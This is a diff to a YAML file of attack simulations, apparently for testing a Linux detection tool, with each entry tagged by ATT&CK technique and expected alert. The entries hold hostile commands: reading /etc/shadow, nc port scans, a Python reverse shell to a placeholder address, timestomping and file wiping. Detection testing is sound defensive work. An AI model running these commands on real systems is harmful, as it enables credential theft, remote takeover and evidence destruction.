@@ -3817,10 +3817,10 @@ attacks:
   - id: VR006
     tactic: TA0006
     technique: T1552.001
-    name: credential_file_read variant 6
+    name: 'credential_file_read sed line-range variant'
     platforms: ['linux']
-    cmd: 'head -1 /etc/shadow'
-    bin: 'head'
+    cmd: 'sed -n ''1,5p'' /etc/shadow'
+    bin: 'sed'
     creates_process: true
     mode: real
     expected_signals: [credential_file_read]
@@ -4402,9 +4402,9 @@ attacks:
   - id: VR051
     tactic: TA0007
     technique: T1046
-    name: net_scan_external variant 12
+    name: 'net_scan_external nc verbose zero-I/O variant'
     platforms: ['linux']
-    cmd: 'nc -z -w 2 203.0.113.10 22'
+    cmd: 'nc -z -v 203.0.113.10 22'
     bin: 'nc'
     creates_process: true
     mode: real
@@ -4415,9 +4415,9 @@ attacks:
   - id: VR052
     tactic: TA0007
     technique: T1046
-    name: net_scan_external variant 13
+    name: 'net_scan_external nc UDP zero-I/O variant'
     platforms: ['linux']
-    cmd: 'nc -z -w 2 203.0.113.10 443'
+    cmd: 'nc -z -u 203.0.113.10 53'
     bin: 'nc'
     creates_process: true
     mode: real
@@ -7028,10 +7028,10 @@ attacks:
   - id: VR253
     tactic: TA0006
     technique: T1003.008
-    name: credential_dump_shadow variant 1
+    name: 'credential_dump_shadow tail variant'
     platforms: ['linux']
-    cmd: 'head -20 /etc/shadow'
-    bin: 'head'
+    cmd: 'tail -n 5 /etc/shadow'
+    bin: 'tail'
     creates_process: true
     mode: real
     expected_signals: [credential_dump_shadow]
@@ -9810,9 +9810,9 @@ attacks:
   - id: VR467
     tactic: TA0007
     technique: T1046
-    name: net_scan_external variant w2-467
+    name: 'net_scan_external nc verbose scan with timeout variant'
     platforms: [linux]
-    cmd: 'nc -vz 203.0.113.20 3306'
+    cmd: 'nc -vz -w 3 203.0.113.20 3306 2>/dev/null'
     bin: 'nc'
     creates_process: true
     mode: real
@@ -10044,10 +10044,10 @@ attacks:
   - id: VR485
     tactic: TA0002
     technique: T1059.004
-    name: reverse_shell variant w2-485
+    name: 'reverse_shell python dup2 fd redirect variant'
     platforms: [linux]
-    cmd: 'bash -c ''bash -i >& /dev/tcp/203.0.113.9/1337 0>&1'''
-    bin: 'bash'
+    cmd: 'python -c ''import socket,subprocess,os; s=socket.socket(); s.connect(("203.0.113.21",9001)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"])'''
+    bin: 'python'
     creates_process: true
     mode: real
     expected_signals: [reverse_shell]
@@ -11473,7 +11473,7 @@ attacks:
     technique: T1548.001
     name: 'do reconnaissance for files that have the setgid bit set'
     platforms: [linux]
-    cmd: 'find /usr/bin -perm -2000'
+    cmd: 'find /usr/sbin -perm -2000 -type f'
     bin: 'find'
     creates_process: true
     mode: real
@@ -11889,10 +11889,10 @@ attacks:
   - id: VR567
     tactic: TA0005
     technique: T1070.006
-    name: timestomp variant 1
+    name: 'timestomp via python os.utime epoch pair'
     platforms: ['linux']
-    cmd: 'touch -t 201901010000 /tmp/qinjing-ts1.log'
-    bin: 'touch'
+    cmd: 'python -c "import os; os.utime(''/tmp/qinjing-ts1.log'', (1577836800, 1577836800))"'
+    bin: 'python'
     creates_process: true
     mode: real
     expected_signals: [timestomp]
@@ -12022,10 +12022,10 @@ attacks:
   - id: VR568
     tactic: TA0005
     technique: T1070.006
-    name: timestomp variant 2
+    name: 'timestomp via perl utime epoch pair'
     platforms: ['linux']
-    cmd: 'touch -t 202012312359 /tmp/qinjing-ts2.log'
-    bin: 'touch'
+    cmd: 'perl -e ''utime 1577836800, 1577836800, "/tmp/qinjing-ts2.log"'''
+    bin: 'perl'
     creates_process: true
     mode: real
     expected_signals: [timestomp]
@@ -12420,9 +12420,9 @@ attacks:
   - id: VR571
     tactic: TA0005
     technique: T1070.006
-    name: timestomp variant 5
+    name: 'timestomp via touch -d absolute date string'
     platforms: ['linux']
-    cmd: 'touch -t 200002291200 /tmp/qinjing-ts5.log'
+    cmd: 'touch -d "2020-01-01 00:00:00" /tmp/qinjing-ts5.log'
     bin: 'touch'
     creates_process: true
     mode: real
@@ -12660,16 +12660,17 @@ attacks:
   - id: VR549
     tactic: TA0005
     technique: T1070.004
-    name: indicator_removal variant 7
+    name: 'indicator_removal dd random-overwrite variant'
     platforms: ['linux']
-    cmd: 'rm -rf /tmp/qinjing-loot'
-    bin: 'rm'
+    cmd: 'dd if=/dev/urandom of=/tmp/qinjing-loot bs=1M count=1'
+    bin: 'dd'
     creates_process: true
     mode: real
     expected_signals: [indicator_removal]
     related_signals: []
     expect: detectable
     impact: temporary
+    cleanup: rm -f /tmp/qinjing-loot
   - id: VR561
     tactic: TA0040
     technique: T1485
@@ -12792,9 +12793,9 @@ attacks:
   - id: VR550
     tactic: TA0005
     technique: T1070.004
-    name: indicator_removal variant 8
+    name: 'indicator_removal shred one-pass variant'
     platforms: ['linux']
-    cmd: 'shred -u /tmp/qinjing-keymat.bin'
+    cmd: 'shred -n 1 -u /tmp/qinjing-keymat.bin'
     bin: 'shred'
     creates_process: true
     mode: real
@@ -12802,6 +12803,7 @@ attacks:
     related_signals: []
     expect: detectable
     impact: temporary
+    cleanup: rm -f /tmp/qinjing-keymat.bin
   - id: VR562
     tactic: TA0040
     technique: T1485
@@ -13345,9 +13347,9 @@ attacks:
   - id: VR578
     tactic: TA0005
     technique: T1070.006
-    name: timestomp variant 12
+    name: 'timestomp via touch -d relative date then reference copy'
     platforms: ['linux']
-    cmd: 'touch -t 201505050505 /tmp/qinjing-ts10.log'
+    cmd: 'touch -d "2 days ago" /tmp/qinjing-ts10.log && touch -r /tmp/qinjing-ts10.log /tmp/qinjing-ts10b.log'
     bin: 'touch'
     creates_process: true
     mode: real
@@ -13355,7 +13357,7 @@ attacks:
     related_signals: []
     expect: detectable
     impact: temporary
-    cleanup: rm -f /tmp/qinjing-ts10.log
+    cleanup: rm -f /tmp/qinjing-ts10.log /tmp/qinjing-ts10b.log
   - id: VR590
     tactic: TA0002
     technique: T1053.002
@@ -13713,9 +13715,9 @@ attacks:
   - id: VR705
     tactic: TA0005
     technique: T1070.006
-    name: timestomp variant w3-705
+    name: 'timestomp via touch -h -t on symlink then stat verify'
     platforms: [linux]
-    cmd: 'touch -h -t 200102030405 /tmp/qinjing-ts-w3b'
+    cmd: 'touch -h -t 200102030405 /tmp/qinjing-ts-w3b && stat -c %y /tmp/qinjing-ts-w3b'
     bin: 'touch'
     creates_process: true
     mode: real
